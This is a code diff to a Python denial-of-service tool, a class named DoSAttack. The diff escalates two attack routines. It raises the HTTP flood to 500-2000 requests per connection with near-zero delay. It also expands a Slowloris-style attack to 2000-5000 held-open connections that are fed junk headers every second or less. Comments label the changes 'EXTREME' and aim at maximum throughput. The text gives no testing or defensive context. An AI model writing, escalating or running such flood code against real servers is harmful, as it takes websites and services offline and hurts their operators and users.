@@ -125,8 +125,8 @@ class DoSAttack:
                 attack_port = random.choice(ports)
                 sock.connect((self.target_ip, attack_port))
 
-                # INCREASED: 50-200 requests per connection (was 1-5)
-                num_reqs = random.randint(50, 200)
+                # EXTREME: 500-2000 requests per connection (10x increase from current, 500-2000x from original)
+                num_reqs = random.randint(500, 2000)
                 
                 for _ in range(num_reqs):
                     path = "/" + _random_string(random.randint(5, 15)) + _random_url_params(random.randint(1, 8))
@@ -153,8 +153,8 @@ class DoSAttack:
                         pass
                     sock.settimeout(5)
                     
-                    # Minimal delay between requests
-                    time.sleep(random.uniform(0.001, 0.005))
+                    # No delay between requests - maximum throughput
+                    time.sleep(random.uniform(0.0001, 0.0005))
 
                 # Read response briefly then close
                 try:
@@ -184,8 +184,8 @@ class DoSAttack:
         sockets = []
 
         # Phase 1: Open initial batch of sockets with partial headers
-        # INCREASED: 200-500 connections (was 50-150)
-        target_conns = random.randint(200, min(500, self.duration * 5))
+        # EXTREME: 2000-5000 connections (10x increase from current 200-500)
+        target_conns = random.randint(2000, min(5000, self.duration * 50))
         
         for _ in range(target_conns):
             if not self.running or time.time() >= end_time:
@@ -217,8 +217,8 @@ class DoSAttack:
             alive = []
             for sock in sockets:
                 try:
-                    # INCREASED: Send 3-5 header lines per keep-alive (was 1)
-                    for _ in range(random.randint(3, 5)):
+                    # EXTREME: Send 10-20 header lines per keep-alive round (was 3-5)
+                    for _ in range(random.randint(10, 20)):
                         header_line = f"X-{_random_string(6)}: {_random_string(16)}\r\n"
                         sock.sendall(header_line.encode())
                         self._inc_count()
@@ -250,8 +250,8 @@ class DoSAttack:
                 except Exception:
                     pass
 
-            # REDUCED WAIT: 3-5 seconds between keep-alive rounds (was 10-15) - generates more packets
-            time.sleep(random.uniform(3, 5))
+            # EXTREME SPEED: 0.5-1 seconds between keep-alive rounds (was 3-5) - 5-10x more packets
+            time.sleep(random.uniform(0.5, 1.0))
 
         # Cleanup
         for sock in sockets:
